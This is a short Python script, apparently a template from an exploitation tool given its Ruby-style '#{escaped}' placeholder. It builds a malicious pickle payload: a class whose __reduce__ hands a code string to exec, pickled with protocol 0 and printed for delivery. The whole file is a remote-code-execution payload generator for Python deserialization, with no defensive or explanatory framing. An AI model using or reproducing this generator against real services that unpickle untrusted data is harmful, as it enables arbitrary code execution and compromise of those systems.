import pickle

class GadgetChain:
    def __reduce__(self):
        return __builtins__.exec, ('#{escaped}',)

if __name__ == '__main__':
    pickled = pickle.dumps(GadgetChain(), protocol=0)
    print(repr(pickled.decode()))
